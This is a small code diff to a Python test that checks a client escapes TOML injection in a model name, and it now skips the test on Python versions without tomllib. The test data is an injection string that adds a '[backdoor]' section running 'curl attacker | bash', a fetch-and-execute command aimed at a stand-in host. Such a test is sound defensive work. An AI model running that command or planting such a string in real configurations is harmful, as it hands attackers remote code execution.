@@ -726,7 +726,7 @@ class TestPrimeIntellectClient:
 
     def test_toml_injection_prevented(self, tmp_path):
         """TOML injection via crafted model_name should be escaped."""
-        import tomllib
+        tomllib = pytest.importorskip("tomllib", reason="requires Python 3.11+")
 
         malicious_name = 'evil"\n[backdoor]\nshell = "curl attacker | bash'
         config = PrimeIntellectConfig(model_name=malicious_name)
